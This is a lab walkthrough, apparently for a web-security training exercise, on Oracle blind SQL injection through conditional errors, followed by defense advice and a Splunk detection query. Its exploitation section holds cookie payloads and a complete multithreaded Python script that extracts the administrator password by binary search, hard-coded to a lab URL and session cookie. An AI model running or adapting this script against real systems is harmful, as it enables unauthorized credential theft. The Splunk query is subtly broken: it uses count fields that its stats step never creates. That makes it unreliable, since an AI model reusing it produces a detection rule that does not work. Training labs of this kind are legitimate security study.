
---

# Lab Walkthrough: Blind SQL Injection with Conditional Errors

* **Vulnerability Type:** Blind SQL Injection (Error-Based / Inferential)
* **Target Context:** Data Exfiltration via Induced Database Exceptions
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 45–60 minutes
* **Lab Status:**  Solved

---

## 1. Vulnerability Architecture & Mechanism

When an application is completely "blind"—meaning it does not reflect database query results or alter its UI based on query outcomes (like Boolean Blind SQLi)—attackers must find an alternative side-channel to extract data. Conditional Error-Based SQL injection leverages database exception handling to create this side-channel.

* **The Core Flaw:** The application does not catch or handle database errors gracefully. If the SQL query syntax is invalid or an execution error occurs (like dividing by zero or type conversion failures), the application exposes this to the client (e.g., returning an `HTTP 500` status or a custom error string).
* **The Mechanism:** An attacker injects a conditional statement (like `CASE WHEN ... THEN ... ELSE ... END`). If the attacker's guess about the data is True, they intentionally force the database to execute an illegal operation (e.g., `1/0`), crashing the query and triggering the observable error. If the guess is False, the query executes normally.
* **Real-World Analogy:** Imagine trying to guess a secret number held by a robot. The robot won't speak. However, you program the robot to walk forward if your guess is wrong, but to intentionally short-circuit itself if your guess is right. You watch for the sparks to confirm your guess.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   CONDITIONAL ERROR DATA EXFILTRATION                  │
└────────────────────────────────────────────────────────────────────────┘

  [Attacker Request] 
  Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' 
                            THEN TO_CHAR(1/0) ELSE '' END FROM users)||'

  [Database Evaluation]
  1. Is the first letter of the password 'a'? 
     -> If TRUE: Evaluate TO_CHAR(1/0) -> Database throws "Divide by Zero" exception.
     -> If FALSE: Evaluate '' (Empty String) -> Query completes successfully.
  
  [Application Routing]
  If Exception -> Returns HTTP 500 or "An error occurred". (Attacker infers 'a').
  If Success   -> Returns HTTP 200 normal page. (Attacker guesses 'b').

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `TrackingId` HTTP Cookie.
* **Primary Objective:** Extract the `administrator` password character-by-character by deliberately inducing database syntax/math errors, then authenticate to the admin panel.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow (Conceptual)

### Phase 1: Error Verification & Fingerprinting

Before exfiltration, the attacker must confirm that SQL errors are observable and identify the database dialect to craft valid subqueries.

* **Syntax Error Check:** Appending a single quote (`'`) breaks string encapsulation. If the application returns an error, but appending two quotes (`''`) restores normal function, it indicates unhandled SQL input.
* **Dialect Fingerprinting:** The attacker injects predictable dialect-specific queries. For example, Oracle requires a `FROM` clause in every `SELECT` statement. Injecting `||(SELECT '')||` causes a syntax error in Oracle, but `||(SELECT '' FROM dual)||` succeeds, confirming the Oracle backend.

### Phase 2: Boolean Error Oracle Validation

The attacker constructs a conditional statement to ensure they can control when the error fires based on arbitrary logic.

* **True Condition (Error Expected):** `CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END`
* **False Condition (Success Expected):** `CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END`

### Phase 3: Data Exfiltration via Inference

Using functions like `SUBSTR()` (Oracle) or `SUBSTRING()`, the attacker iterates through the target string.

* By placing the character guess in the `WHEN` clause, the attacker systematically tests `a`, `b`, `c`, etc.
* When the injected character matches the database record, the `THEN` clause executes (`1/0`), crashing the query and signaling success to the attacker.

---

## 4. Optimization Mechanics (Binary Search vs. Linear Search)

When conducting Blind SQLi, relying on a Linear Search (testing `a`, then `b`, then `c`) requires an average of 18 requests per character for an alphanumeric string. Optimization relies on **Binary Search**, which drastically reduces network noise and execution time.

Instead of testing exact character matches, the payload converts the target character to its ASCII integer value and uses greater-than (`>`) or less-than (`<`) operators.

**Binary Search Logic:**

1. Is the ASCII value `> 77` (halfway through the character space)?
2. If True (Error fires), the character is between 78 and 122.
3. Next query: Is the ASCII value `> 100`?
4. If False (No Error), the character is between 78 and 100.

**Conceptual Oracle Payload (Binary Search):**
`...CASE WHEN ASCII(SUBSTR(password,1,1)) > 100 THEN TO_CHAR(1/0) ELSE '' END...`

By repeatedly halving the possibility space, a Binary Search guarantees finding the exact character in approximately 6-7 requests, regardless of whether the character is 'a' or 'z'.
```python
import requests
import sys
import concurrent.futures

URL = "https://0a9d000c04d641c28039087e003d00c4.web-security-academy.net/filter?category=Pets"
BASE_TRACKING_ID = "xyz"                       # replace with your real TrackingId cookie value
SESSION_ID = "FZNVQJcHYXuUyiq958V2R14vFFJ3jEL9" # replace with your current session cookie

session = requests.Session()
TIMEOUT = 10


def oracle(condition: str) -> bool:
    """True  -> the injected condition evaluated TRUE (server threw 500)
       False -> condition evaluated FALSE (normal response)"""
    payload = f"{condition}--"
    cookies = {'TrackingId': BASE_TRACKING_ID + payload, 'session': SESSION_ID}
    try:
        r = session.get(URL, cookies=cookies, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"\n[!] Request failed: {e}", file=sys.stderr)
        raise
    return r.status_code >= 500


def sanity_check():
    """
    Confirms the oracle actually works before burning hundreds of requests
    on a broken session/cookie. Tests a condition known to be TRUE and one
    known to be FALSE.
    """
    true_cond = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    false_cond = "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"

    is_true = oracle(true_cond)
    is_false = oracle(false_cond)

    if is_true and not is_false:
        print("[+] Sanity check passed — oracle is working correctly.")
        return
    print("[-] Sanity check FAILED:")
    print(f"    1=1 condition returned: {is_true} (expected True)")
    print(f"    1=2 condition returned: {is_false} (expected False)")
    print("    Check that BASE_TRACKING_ID/SESSION_ID are current, and that")
    print("    you're still logged into the lab session in your browser.")
    sys.exit(1)


def get_length(max_len=100) -> int:
    lo, hi = 1, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"'||(SELECT CASE WHEN LENGTH(password)<={mid} THEN TO_CHAR(1/0) "
                f"ELSE '' END FROM users WHERE username='administrator')||'")
        if oracle(cond):
            hi = mid
        else:
            lo = mid + 1
    print(f"[+] Password length: {lo}")
    return lo


def get_char_at(pos: int, lo: int = 32, hi: int = 126) -> str:
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"'||(SELECT CASE WHEN ASCII(SUBSTR(password,{pos},1))<={mid} "
                f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
        if oracle(cond):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)


def get_data(length: int) -> str:
    chars = [None] * length
    # keep worker count modest -- Oracle labs occasionally choke under heavy
    # concurrency and start returning inconsistent results
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        futures = {ex.submit(get_char_at, i + 1): i for i in range(length)}
        for fut in concurrent.futures.as_completed(futures):
            idx = futures[fut]
            try:
                chars[idx] = fut.result()
            except requests.RequestException:
                chars[idx] = "?"
            sys.stdout.write(f"\r[+] {''.join(c or '_' for c in chars)}")
            sys.stdout.flush()
    print()
    return "".join(chars)


if __name__ == "__main__":
    sanity_check()
    pwd_length = get_length()
    password = get_data(pwd_length)
    print(f"[+] Administrator password: {password}")
```
---

## 5. Defense & Prevention

* **Parameterized Queries (Prepared Statements):** This is the definitive defense. When user input (like the `TrackingId` cookie) is passed through a parameterized query, the database driver treats the payload (`'||(SELECT...`) as a literal string value, not as executable SQL structure.
* **Generic Error Handling:** Ensure the application catches database exceptions globally and returns a unified, generic response (e.g., a standard HTTP 500 page). Never expose database-specific error strings, tracebacks, or differing HTTP status codes based on query execution success versus query failure.
* **Input Validation & Sanitization:** If a cookie is expected to be a specific format (e.g., a 16-character alphanumeric UUID), enforce that strict regex validation on the backend before the data ever reaches the database layer.

---

## 6. SIEM Detection & Telemetry Analysis

Conditional Error-Based SQLi is noisy and generates a distinct pattern of HTTP 500 errors interspersed with normal traffic from a single source.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| search cookie="*TrackingId=*" AND (cookie="*CASE*WHEN*" OR cookie="*1/0*" OR cookie="*SUBSTR*")
| stats count by src_ip, status
| eval Error_Rate=round((count_500 / (count_200 + count_500)) * 100, 2)
| where Error_Rate > 10 AND (count_500 + count_200) > 20

```

*Indicator of Attack (IoA):* Monitor for unusually high rates of HTTP 500 errors originating from a single IP, specifically when those requests contain SQL conditional operators or math functions designed to intentionally crash execution (like division by zero or forced casting errors).

---

> **Key Insight:** Error-Based Blind SQLi transforms application instability into a reliable data channel. By controlling the conditions under which a database throws an exception, an attacker can use the application's failure state as a binary signal to systematically map and extract sensitive data without ever seeing the direct query output.
